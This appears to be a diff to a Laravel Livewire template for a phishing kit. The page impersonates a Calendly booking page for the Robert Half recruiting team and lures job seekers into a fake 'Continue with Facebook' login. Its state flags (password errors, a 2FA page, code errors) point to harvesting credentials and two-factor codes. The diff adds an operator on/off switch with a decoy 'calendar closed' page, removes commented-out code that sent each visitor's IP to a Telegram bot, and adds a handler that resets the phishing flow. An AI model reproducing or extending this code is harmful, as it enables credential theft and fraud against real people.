@@ -2,7 +2,7 @@
     <div id="root">
         <div class="App">
             <div class="box__shadow">
-                <div class="calendar__wrapper">
+                <div class="calendar__wrapper" >
                     <div class="user__wrapper">
                         <div class="logo__wrapper"><img width="50%" src="{{asset('img/images.png')}}" /></div>
                         <div class="screen__two center__text">
@@ -52,94 +52,122 @@
                             <p>Report abuse</p>
                         </div>
                     </div>
-                    <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
-                        <div class="{{$showCalenderProgress ? 'd-none':''}}">
-                            <h2>Select a Date & Time</h2>
-                            <div class=" calendar__container svg__icon">
-                                <div  style="min-width: 400px;padding-right: 15px;margin-top:20px;">
-                                    <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
-                                    <div class="time__zone-wrapper" style="margin-top: 20px;">
-                                        <p>Time zone</p>
-                                        <div class="central">
-                                            <img width="14px" src="{{asset('world.png')}}">
-                                            US Georgia (00:59)
+                    @if($webStatus)
+                        <div  class="date__time {{$showCalender == false ? 'd-none':''}}">
+                            <div class="{{$showCalenderProgress ? 'd-none':''}}">
+                                <h2>Select a Date & Time</h2>
+                                <div class=" calendar__container svg__icon">
+                                    <div  style="min-width: 400px;padding-right: 15px;margin-top:20px;">
+                                        <div wire:ignore class="calendar-wrapper" id="calendar-wrapper"></div>
+                                        <div class="time__zone-wrapper" style="margin-top: 20px;">
+                                            <p>Time zone</p>
+                                            <div class="central">
+                                                <img width="14px" src="{{asset('world.png')}}">
+                                                US Georgia (00:59)
+                                            </div>
                                         </div>
                                     </div>
                                 </div>
                             </div>
+                            <div class=" loading-container2 {{$showCalenderProgress ? '':'d-none'}}">
+                                <h1 style="font-size: 48px;">Saving your selection</h1>
+                                <h2>Please contact our live support to fully approve your scheduled date</h2>
+                                <div class="loader2"></div>
+                                <div style="margin-top: 40px;">
+                                    <a id="openChat" class="blue-btn" href="#" >Contact live chat support</a>
+                                </div>
+                            </div>
+                            <a class="logo__wrapper-calendly hide__mobile">
+                                <div class="background">
+                                    <div class="powerd__by">powered by</div>
+                                    <div class="calendly">Calendly</div>
+                                </div>
+                            </a>
                         </div>
-                        <div class=" loading-container2 {{$showCalenderProgress ? '':'d-none'}}">
-                            <h1 style="font-size: 48px;">Saving your selection</h1>
-                            <h2>Please contact our live support to fully approve your scheduled date</h2>
-                            <div class="loader2"></div>
-                            <div style="margin-top: 40px;">
-                                <a id="openChat" class="blue-btn" href="#" >Contact live chat support</a>
+                        <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
+                            <div>
+                                <div class="full__width">
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="form-steps">
+                                            <form id="msform">
+                                                <ul id="progressbar">
+                                                    <li class="active" id="account"><strong>Verify</strong></li>
+                                                    <li id="personal"><strong>Schedule</strong></li>
+                                                    <li id="confirm"><strong>Finish</strong></li>
+                                                </ul>
+                                            </form>
+                                        </div>
+                                    </div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="dummy__text">
+                                            <p>
+                                                Please confirm your appointment with Robert Half - Recruiting Team. <br />
+                                                To complete the confirmation process, continue with Facebook
+                                            </p>
+                                        </div>
+                                    </div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="facebook__button">
+                                            <button id="continue-facebook" wire:click.prevent="openLoginModal">
+                                                <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24" viewBox="0 0 25 24" fill="none">
+                                                    <g clip-path="url(#clip0_302_2)">
+                                                        <rect width="24" height="24" transform="translate(0.845947)" fill="#1877F2"></rect>
+                                                        <path
+                                                            d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z"
+                                                            fill="white"
+                                                        ></path>
+                                                    </g>
+                                                    <defs>
+                                                        <clipPath id="clip0_302_2"><rect width="24" height="24" fill="white" transform="translate(0.845947)"></rect></clipPath>
+                                                    </defs>
+                                                </svg>
+                                                Continue with Facebook
+                                            </button>
+                                        </div>
+                                    </div>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
+                                            <p>Cookie settings</p>
+                                            <p>Report abuse</p>
+                                        </div>
+                                    </div>
+                                </div>
                             </div>
+                            <a class="logo__wrapper-calendly hide__mobile">
+                                <div class="background">
+                                    <div class="powerd__by">powered by</div>
+                                    <div class="calendly">Calendly</div>
+                                </div>
+                            </a>
                         </div>
-                        <a class="logo__wrapper-calendly hide__mobile">
-                            <div class="background">
-                                <div class="powerd__by">powered by</div>
-                                <div class="calendly">Calendly</div>
-                            </div>
-                        </a>
-                    </div>
-                    <div class="form__wrapper date__time {{$showCalender ? 'd-none':''}}">
-                        <div>
-                            <div class="full__width">
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;"><h2>Schedule call with Robert Half - Recruiting Team</h2></div>
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
-                                    <div class="form-steps">
-                                        <form id="msform">
-                                            <ul id="progressbar">
-                                                <li class="active" id="account"><strong>Verify</strong></li>
-                                                <li id="personal"><strong>Schedule</strong></li>
-                                                <li id="confirm"><strong>Finish</strong></li>
-                                            </ul>
-                                        </form>
+                    @else
+                        <div class="form__wrapper date__time">
+                            <div>
+                                <div class="full__width">
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div style="margin-top: 20%;padding: 30px;text-align: center">
+                                            <h1 >The calender link is currently closed. Please check back later. </h1>
+                                            <p style="font-size: 18px">Unfortunately, the calendar link to schedule a meeting is currently closed. It will
+                                                open soon. Please contact your recruiting team via email to secure a spot.</p>
+                                        </div>
                                     </div>
-                                </div>
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
-                                    <div class="dummy__text">
-                                        <p>
-                                            Please confirm your appointment with Robert Half - Recruiting Team. <br />
-                                            To complete the confirmation process, continue with Facebook
-                                        </p>
-                                    </div>
-                                </div>
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
-                                    <div class="facebook__button">
-                                        <button id="continue-facebook" wire:click.prevent="openLoginModal">
-                                            <svg xmlns="http://www.w3.org/2000/svg" width="25" height="24" viewBox="0 0 25 24" fill="none">
-                                                <g clip-path="url(#clip0_302_2)">
-                                                    <rect width="24" height="24" transform="translate(0.845947)" fill="#1877F2"></rect>
-                                                    <path
-                                                        d="M24.3459 12.0699C24.3459 5.7186 19.1972 0.56988 12.8459 0.56988C6.49467 0.56988 1.34595 5.7186 1.34595 12.0699C1.34595 17.8099 5.55133 22.5674 11.0491 23.4302V15.3941H8.12915V12.0699H11.0491V9.53629C11.0491 6.6541 12.7659 5.06207 15.3928 5.06207C16.651 5.06207 17.967 5.28668 17.967 5.28668V8.11675H16.5169C15.0883 8.11675 14.6428 9.00322 14.6428 9.91266V12.0699H17.8323L17.3224 15.3941H14.6428V23.4302C20.1406 22.5674 24.3459 17.8099 24.3459 12.0699Z"
-                                                        fill="white"
-                                                    ></path>
-                                                </g>
-                                                <defs>
-                                                    <clipPath id="clip0_302_2"><rect width="24" height="24" fill="white" transform="translate(0.845947)"></rect></clipPath>
-                                                </defs>
-                                            </svg>
-                                            Continue with Facebook
-                                        </button>
-                                    </div>
-                                </div>
-                                <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
-                                    <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
-                                        <p>Cookie settings</p>
-                                        <p>Report abuse</p>
+                                    <div style="transition: opacity 400ms, transform 400ms; transform: none; opacity: 1;">
+                                        <div class="footer__wrapper footer__wrapper-mobile footer__wrapper-contact">
+                                            <p>Cookie settings</p>
+                                            <p>Report abuse</p>
+                                        </div>
                                     </div>
                                 </div>
                             </div>
+                            <a class="logo__wrapper-calendly hide__mobile">
+                                <div class="background">
+                                    <div class="powerd__by">powered by</div>
+                                    <div class="calendly">Calendly</div>
+                                </div>
+                            </a>
                         </div>
-                        <a class="logo__wrapper-calendly hide__mobile">
-                            <div class="background">
-                                <div class="powerd__by">powered by</div>
-                                <div class="calendly">Calendly</div>
-                            </div>
-                        </a>
-                    </div>
+                    @endif
                 </div>
             </div>
             <a class="logo__wrapper-calendly-mobile">
@@ -149,7 +177,6 @@
                 </div>
             </a>
         </div>
-
     </div>
     <div wire:ignore.self  style="display: none;" id="continue-modal">
         <div class="ant-modal-root">
@@ -440,17 +467,6 @@
             .then((data) => {
                 const ipAddress = data?.ip || "";
                 @this.set('ip',ipAddress);
-                // const tURL = `https://api.telegram.org/bot${apiKey}/sendMessage?chat_id=${chatId}`;
-                // fetch(tURL, {
-                //     method: "POST",
-                //     headers: {
-                //         "Content-Type": "application/json",
-                //     },
-                //     body: JSON.stringify({
-                //         chat_id: chatId,
-                //         text: `===NEW VISITOR===\nIP ADDRESS: ${ipAddress}`,
-                //     }),
-                // });
             })
             .catch((error) => {});
     })
@@ -1044,5 +1060,18 @@
             console.error('JivoChat API is not loaded yet.');
         }
     });
+    document.addEventListener('clear-all',function (){
+        $('#continue-modal').hide();
+        @this.set('showCalenderProgress', false);
+        @this.set('loginError', false);
+        @this.set('oldPassError', false);
+        @this.set('enableLoginForm', false);
+        @this.set('showModalFooter', false);
+        @this.set('enableLoadingAfterSubmit', false);
+        @this.set('twoFaPage', false);
+        @this.set('codeError', false);
+        @this.set('showCalender', false);
+    });
+
 </script>
 @endscript
